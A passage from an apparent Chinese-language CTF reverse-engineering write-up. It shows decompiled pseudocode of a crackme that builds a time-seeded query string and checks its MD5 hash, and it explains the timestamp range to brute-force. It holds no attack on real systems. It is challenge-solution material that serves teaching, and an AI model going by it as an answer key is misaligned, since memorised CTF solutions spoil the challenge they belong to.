</span></span><span class=line><span class=cl>    <span class=n>gen_query</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v8</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v49</span><span class=p>,</span> <span class=n>v9</span><span class=p>,</span> <span class=n>v10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v57</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v54</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v12</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>c_str</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v11</span><span class=p>,</span> <span class=n>v49</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v15</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v12</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v53</span><span class=p>,</span> <span class=n>v13</span><span class=p>,</span> <span class=n>v14</span><span class=p>,</span> <span class=n>v41</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>sub_14000A820</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v15</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v50</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v54</span><span class=p>,</span> <span class=n>v16</span><span class=p>,</span> <span class=n>v42</span><span class=p>,</span> <span class=n>v47</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>sub_14000A6E0</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v17</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v54</span><span class=p>,</span> <span class=n>v18</span><span class=p>,</span> <span class=n>v19</span><span class=p>,</span> <span class=n>v43</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v20</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;query: &#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v21</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v49</span><span class=p>,</span> <span class=n>v20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>,</span> <span class=n>v21</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v22</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v50</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>,</span> <span class=n>v22</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v23</span><span class=p>,</span> <span class=n>v50</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v24</span><span class=p>,</span> <span class=n>v49</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>basic_string</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v8</span><span class=p>,</span> <span class=n>v52</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v25</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;Please input the right query string I used:&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>,</span> <span class=n>v25</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&gt;&gt;&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v52</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v56</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v55</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v27</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>c_str</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v26</span><span class=p>,</span> <span class=n>v52</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v30</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v27</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v53</span><span class=p>,</span> <span class=n>v28</span><span class=p>,</span> <span class=n>v29</span><span class=p>,</span> <span class=n>v41</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sub_14000A820</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v30</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v51</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v55</span><span class=p>,</span> <span class=n>v31</span><span class=p>,</span> <span class=n>v44</span><span class=p>,</span> <span class=n>v47</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sub_14000A6E0</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v32</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v55</span><span class=p>,</span> <span class=n>v33</span><span class=p>,</span> <span class=n>v34</span><span class=p>,</span> <span class=n>v45</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>sub_14000A8E0</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                          <span class=n>a1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=n>a2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=s>&#34;8a2fc1e9e2830c37f8a7f51572a640aa&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v51</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=n>v35</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=n>v36</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=n>v46</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=n>v48</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>v37</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;Congratulations!&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=n>v37</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;Wrong!&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>,</span> <span class=n>v37</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v38</span><span class=p>,</span> <span class=n>v51</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v39</span><span class=p>,</span> <span class=n>v52</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看出我们需要得到正确的query并满足query md5加密后的值等于8a2fc1e9e2830c37f8a7f51572a640aa；if里是对时间的判断显然是告诉我们要爆破的话时间范围是(1751990400,1752052051)</p><p>进入gen_query可以看到各个参数的生成，可以看到两种query，一种是满足pow_like函数的判断则没有a、b、x、y参数，但多了cipher参数；get_rand是模拟生成随机数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_140001963</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>__time64_t</span> <span class=o>*</span><span class=n>a1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kr>__int64</span> <span class=n>a2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>a3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kr>__int64</span> <span class=n>a4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>a5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>a6</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>double</span> <span class=n>a7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>double</span> <span class=n>a8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>double</span> <span class=n>a9</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>double</span> <span class=n>a10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#34;+&#34; TO EXPAND]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>sub_140001518</span><span class=p>((</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>a3</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v51</span><span class=p>,</span> <span class=n>a5</span><span class=p>,</span> <span class=n>a6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>time</span> <span class=o>=</span> <span class=n>get_time</span><span class=p>(</span><span class=n>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sub_1400014B5</span><span class=p>((</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v10</span><span class=p>,</span> <span class=n>time</span><span class=p>,</span> <span class=n>v11</span><span class=p>,</span> <span class=n>v12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v58</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v57</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v56</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v55</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>gen_rand</span><span class=p>();</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v58</span> <span class=o>=</span> <span class=n>gen_rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>v57</span> <span class=o>=</span> <span class=n>gen_rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>v56</span> <span class=o>=</span> <span class=n>gen_rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>v55</span> <span class=o>=</span> <span class=n>gen_rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>v52</span> <span class=o>=</span> <span class=n>gen_rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>basic_stringstream</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;::</span><span class=n>basic_stringstream</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v13</span><span class=p>,</span> <span class=n>v49</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v14</span> <span class=o>=</span> <span class=p>(</span><span class=kt>double</span><span class=p>)</span><span class=n>dword_14000B0E0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v15</span> <span class=o>=</span> <span class=p>(</span><span class=kt>double</span><span class=p>)(</span><span class=kt>int</span><span class=p>)(</span><span class=n>v58</span> <span class=o>|</span> <span class=n>v56</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v18</span> <span class=o>=</span> <span class=n>v14</span> <span class=o>*</span> <span class=n>pow_like</span><span class=p>(</span><span class=n>v15</span><span class=p>,</span> <span class=mf>2.0</span><span class=p>,</span> <span class=n>v15</span><span class=p>,</span> <span class=n>a10</span><span class=p>,</span> <span class=n>v16</span><span class=p>,</span> <span class=n>v17</span><span class=p>,</span> <span class=p>(</span><span class=kt>double</span><span class=p>)</span><span class=n>dword_14000B0E0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v19</span> <span class=o>=</span> <span class=p>(</span><span class=kt>double</span><span class=p>)</span><span class=n>dword_14000B0E4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v18</span> <span class=o>==</span> <span class=n>pow_like</span><span class=p>((</span><span class=kt>double</span><span class=p>)(</span><span class=kt>int</span><span class=p>)(</span><span class=n>v57</span> <span class=o>|</span> <span class=n>v55</span><span class=p>),</span> <span class=mf>2.0</span><span class=p>,</span> <span class=n>v15</span><span class=p>,</span> <span class=p>(</span><span class=kt>double</span><span class=p>)(</span><span class=kt>int</span><span class=p>)(</span><span class=n>v57</span> <span class=o>|</span> <span class=n>v55</span><span class=p>),</span> <span class=n>v20</span><span class=p>,</span> <span class=n>v21</span><span class=p>,</span> <span class=n>v18</span><span class=p>)</span> <span class=o>*</span> <span class=n>v19</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v22</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;salt=&#34;</span><span class=p>,</span> <span class=n>v50</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v23</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v51</span><span class=p>,</span> <span class=n>v22</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v24</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;&amp;t=&#34;</span><span class=p>,</span> <span class=n>v23</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v25</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>time</span><span class=p>,</span> <span class=n>v24</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v26</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;&amp;r=&#34;</span><span class=p>,</span> <span class=n>v25</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v27</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v52</span><span class=p>,</span> <span class=n>v26</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v28</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;&amp;cipher=&#34;</span><span class=p>,</span> <span class=n>v27</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v31</span> <span class=o>=</span> <span class=n>sub_14000184D</span><span class=p>((</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>time</span><span class=p>,</span> <span class=n>v52</span><span class=p>,</span> <span class=n>v29</span><span class=p>,</span> <span class=n>v30</span><span class=p>,</span> <span class=n>v48</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v31</span><span class=p>,</span> <span class=n>v28</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v32</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;salt=&#34;</span><span class=p>,</span> <span class=n>v50</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v33</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v51</span><span class=p>,</span> <span class=n>v32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v34</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;&amp;t=&#34;</span><span class=p>,</span> <span class=n>v33</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v35</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>time</span><span class=p>,</span> <span class=n>v34</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v36</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;&amp;r=&#34;</span><span class=p>,</span> <span class=n>v35</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v37</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>v52</span><span class=p>,</span> <span class=n>v36</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v38</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=s>&#34;&amp;a=&#34;</span><span class=p>,</span> <span class=n>v37</span><span class=p>);</span>
